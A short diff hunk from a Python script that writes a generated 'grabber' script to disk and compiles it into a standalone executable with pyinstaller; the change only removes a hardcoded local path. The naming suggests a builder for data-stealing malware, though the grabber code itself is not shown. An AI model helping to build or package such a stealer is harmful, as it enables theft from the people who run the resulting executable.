@@ -229,4 +229,4 @@ except Exception:
 
 open('generatedgrabber.py', 'wb').write(bytes(grabbercode.encode('ascii')))
 
-os.system('C:\Users\JeheRbeb\Desktop\Nighty pyinstaller --onefile -c -F generatedgrabber.py')
+os.system('pyinstaller --onefile -c -F generatedgrabber.py')
